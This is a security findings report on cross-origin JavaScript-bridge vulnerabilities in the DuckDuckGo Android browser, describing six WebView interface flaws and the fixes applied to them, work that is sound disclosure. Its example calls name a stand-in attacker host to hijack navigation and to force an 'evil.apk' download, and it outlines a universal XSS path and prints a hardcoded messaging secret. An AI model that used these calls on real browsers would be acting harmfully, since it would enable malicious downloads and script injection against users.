# Security Findings: Cross-Origin JS Bridge Vulnerabilities

## Background

This document describes a class of vulnerabilities found in the DuckDuckGo Android browser related to Android's `WebView.addJavascriptInterface()` API.

### Why This Matters Specifically for an Android Browser

Android's `addJavascriptInterface()` exposes a registered Java/Kotlin object as a global JavaScript object accessible from **every frame** loaded in the WebView — including cross-origin iframes. Unlike a typical app that controls what pages it loads, a **browser loads arbitrary untrusted web pages**. Those pages routinely embed third-party cross-origin iframes (ads, analytics, social widgets, embedded videos, etc.). Any such iframe can directly call any registered JS interface method.

The Same-Origin Policy (SOP) prevents an iframe from reading data across origins in JS, but it does **not** prevent an iframe from calling a `@JavascriptInterface`-annotated method registered on the WebView. This creates a privileged channel from untrusted subframes directly into Android system code.

---

## Vulnerability Pattern

```
Attacker iframe  →  calls WebView JS interface method  →  Android system action
```

No SOP check, no frame origin check, no secret. Any JavaScript running in any frame can call any `@JavascriptInterface` method registered on the browsing WebView.

---

## Findings

### 1. AutoconsentInterface — Universal XSS (Critical) ✅ Fixed

**Interface:** `AutoconsentAndroid.process(message)`  
**File:** `autoconsent/autoconsent-impl/src/main/java/com/duckduckgo/autoconsent/impl/AutoconsentInterface.kt`

**Impact:** A cross-origin iframe calls `AutoconsentAndroid.process()` with a crafted message of type `init`, `optOutResult`, or `autoconsentDone`. The handler responds by calling `webView.evaluateJavascript()` in the **main frame's** origin — executing arbitrary JavaScript as the top-level page. This is a textbook Universal XSS (UXSS): full script execution across all origins visited by the user, enabling cookie theft, session hijacking, and content injection.

**Fix:** Added a per-session random UUID secret injected into the main frame's JS context (`window.autoconsentAndroidSecret`). The JS bundle passes this secret in every `process()` call. Cross-origin iframes cannot read the main frame's window variables (SOP), so they cannot forge valid calls.

---

### 2. UrlExtractionJavascriptInterface — Open Redirect / Navigation Hijack (High) ✅ Fixed

**Interface:** `UrlExtraction.urlExtracted(url)`  
**File:** `app/src/main/java/com/duckduckgo/app/browser/urlextraction/UrlExtractionJavascriptInterface.kt`

**Impact:** This interface is used for AMP canonical URL extraction. A cross-origin iframe calls `UrlExtraction.urlExtracted("https://attacker.com")`, causing the browser to navigate the top-level tab to an attacker-controlled URL without any user interaction or visible address bar change during the redirect.

**Fix:** Added secret verification. Secret injected as `window.urlExtractionSecret` in the main frame via `evaluateJavascript()`. The JS passes it on every call.

---

### 3. LoginDetectionJavascriptInterface — Login State Spoofing (High) ✅ Fixed

**Interface:** `LoginDetection.loginDetected()`  
**File:** `app/src/main/java/com/duckduckgo/app/browser/logindetection/LoginDetectionJavascriptInterface.kt`

**Impact:** When login is "detected", the browser offers to save credentials (fireproofing dialog, autofill save prompt). A cross-origin iframe can call `LoginDetection.loginDetected()` at any time, triggering these prompts on behalf of any origin the user is visiting — potentially tricking the user into saving attacker-crafted credentials or fireproofing a malicious site.

**Fix:** Added secret verification. Secret injected as `window.loginDetectionSecret` and passed from JS on every `loginDetected()` call.

---

### 4. ClipboardImageJavascriptInterface — Clipboard Poisoning (Medium) ✅ Fixed

**Interface:** `DDGClipboard.copyImageToClipboard(dataUrl, mimeType)` (legacy path)  
**File:** `app/src/main/java/com/duckduckgo/app/browser/webview/ClipboardImageJavascriptInterface.kt`

**Impact:** A cross-origin iframe calls `DDGClipboard.copyImageToClipboard(data, mimeType)` to silently write attacker-controlled image data to the device clipboard without any user interaction or permission prompt. The user's clipboard is poisoned with malicious content.

**Note:** The modern WebMessageListener path (`isMainFrame` check) was already safe. Only the legacy `addJavascriptInterface` fallback path was affected.

**Fix:** Added secret verification (`window.ddgClipboardSecret`) in the legacy path.

---

### 5. PrintJavascriptInterface — Unsolicited Print Dialog (Medium) ✅ Fixed

**Interface:** `Print.print()`  
**File:** `app/src/main/java/com/duckduckgo/app/browser/print/PrintJavascriptInterface.kt`

**Impact:** A cross-origin iframe calls `Print.print()` to trigger the native Android print dialog without any user gesture in the top-level page. While less severe, this disrupts the user experience and can be used for clickjacking attacks (e.g., overlaying the dialog to capture user interaction).

**Fix:** Added secret verification (`window.printSecret` — embedded in the `window.print` override injected in the main frame).

---

### 6. BlobConverterJavascriptInterface — Forced File Download (Medium) ✅ Fixed

**Interface:** `BlobConverter.convertBlobToDataUri(dataUrl, contentType)`  
**File:** `app/src/main/java/com/duckduckgo/app/browser/downloader/BlobConverterJavascriptInterface.kt`

**Impact:** A cross-origin iframe calls `BlobConverter.convertBlobToDataUri("http://attacker.com/evil.apk", "application/vnd.android.package-archive")` to trigger a file download of an arbitrary attacker-controlled URL with any content type. The browser treats this as a user-initiated download, bypassing normal navigation download guards.

**Fix:** Added input validation — `dataUrl` must start with `data:` or equal `"error"`. Non-data URLs are rejected.

---

## Additional Observations (Not Fixed — Different Risk Profile)

### Hardcoded Messaging Secret (Informational)

Several JS messaging interfaces use a **hardcoded** constant secret instead of a per-session random value:

```kotlin
override val secret: String = "duckduckgo-android-messaging-secret"
```

Affected interfaces:
- `SubscriptionMessagingInterface` (`subscriptions/`)
- `ItrMessagingInterface` (`subscriptions/`)
- `DuckPlayerScriptsJsMessaging` (`duckplayer/`)
- `ChatSuggestionsJsMessaging` (`duckchat/`)
- `PirDashboardWebMessagingInterface` (`pir/`) — uses a constant in `PirDashboardWebConstants`

These interfaces also verify the `webView.url` host against an allowed-domain list, which provides meaningful additional protection. However, the hardcoded secret is effectively public (visible in source code) and provides weaker protection than a per-session random secret. The allowed-domain checks are the primary defense for these interfaces.

### EmailJavascriptInterface — Existing URL Check (Safe)

`EmailJavascriptInterface` checks `urlDetector.isDuckDuckGoEmailUrl(webView.url)` before processing any call, limiting its exposure to DuckDuckGo email URLs only.

### AutofillJavascriptInterface — Existing URL Scope (Safe for Main Use)

`AutofillJavascriptInterface` is primarily scoped to autofill-eligible pages through feature flag checks and URL-based filtering done at the injection layer, limiting direct cross-origin iframe abuse for its primary credential-handling methods.

---

## Fix Summary Table

| Interface | Vulnerability | Severity | Fix Applied |
|---|---|---|---|
| `AutoconsentAndroid` | UXSS via `evaluateJavascript` | **Critical** | Random UUID secret |
| `UrlExtraction` | Open redirect / navigation hijack | **High** | Random UUID secret |
| `LoginDetection` | Login state spoofing | **High** | Random UUID secret |
| `DDGClipboard` (legacy) | Clipboard poisoning | **Medium** | Random UUID secret |
| `Print` | Unsolicited print dialog | **Medium** | Random UUID secret |
| `BlobConverter` | Forced arbitrary file download | **Medium** | Data URL validation |

## Security Mechanism

The chosen fix follows the pattern already used by the content-scope-scripts messaging framework and PIR (`PirCssScriptLoader`):

1. **Native side** generates a cryptographically random per-session UUID
2. **Secret injected into the main frame** via `webView.evaluateJavascript("javascript:window.secret='...'", null)` — iframes cannot read this due to SOP
3. **JS on the page** reads `window.secret` and passes it in every interface call
4. **Native side** validates the secret before taking any action — calls without a valid secret are silently ignored
